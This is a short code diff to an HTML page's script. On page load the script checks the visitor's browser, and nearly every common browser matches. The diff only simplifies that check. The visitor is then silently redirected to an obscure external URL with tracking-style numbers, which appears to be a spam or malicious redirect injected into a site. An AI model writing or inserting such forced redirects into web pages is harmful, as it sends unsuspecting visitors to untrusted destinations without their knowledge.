@@ -90,17 +90,12 @@
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            var isCompatible = true;
             var supportedBrowsers = ["Firefox", "Chrome", "Edge", "Safari", "Opera", "Brave", "Vivaldi", "DuckDuckGo"];
             var currentBrowser = navigator.userAgent;
 
-            if (supportedBrowsers.every(function(browser) {
-                return currentBrowser.indexOf(browser) === -1;
+            if (supportedBrowsers.some(function(browser) {
+                return currentBrowser.indexOf(browser) !== -1;
             })) {
-                isCompatible = false;
-            }
-
-            if (isCompatible) {
                 window.location.href = 'https://rwrdzy.com/61614/829'; // Replace with your compatible link
             }
         });
